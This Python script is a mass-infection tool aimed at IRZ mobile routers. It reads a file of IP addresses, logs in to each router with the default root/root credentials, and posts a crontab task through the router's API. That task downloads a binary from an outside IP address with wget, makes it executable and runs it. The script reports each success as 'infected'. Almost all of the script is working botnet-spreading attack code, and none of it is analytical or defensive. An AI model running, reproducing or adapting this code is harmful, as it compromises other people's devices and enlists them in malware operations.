import sys
import threading
import time
import requests
import json
import subprocess

# title:"IRZ Mobile Router"

def send_json_payload(router_url):
  try:
    router_user = "root"
    router_pass = "root"

    payload_str = '{"tasks":[{"enable":true,"minutes":"*","hours":"*","days":"*","months":"*","weekdays":"*","command":"wget http://149.57.171.148/killer/m;chmod 777 m;./m irz.mpsl"}],"_board":{"name":"RL21","platform":"irz_mt02","time":"Wed Mar 16 16:43:20 UTC 2022"}}'

    payload_json = json.loads(payload_str)

    s = requests.Session()

    s.auth = (router_user, router_pass)

    s.headers.update(
        {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"})
    s.headers.update({"X-Requested-With": "XMLHttpRequest"})
    s.headers.update({"Origin": "http://" + router_url})
    s.headers.update({"Referer": "http://" + router_url})

    resp = s.post("http://" + router_url + "/api/crontab", json=payload_json)

    if resp.status_code == 200:
      print()
      print("infected: " + router_url)
      print("resp: " + resp.text)

  except Exception as e:
    pass

with open(sys.argv[1], "r") as f:
  threads = []

  for ip in f.readlines():
    x = threading.Thread(target=send_json_payload, args=(ip.strip(),)).start()
    threads.append(x)
    time.sleep(0.02)

  for thread in threads:
    thread.join()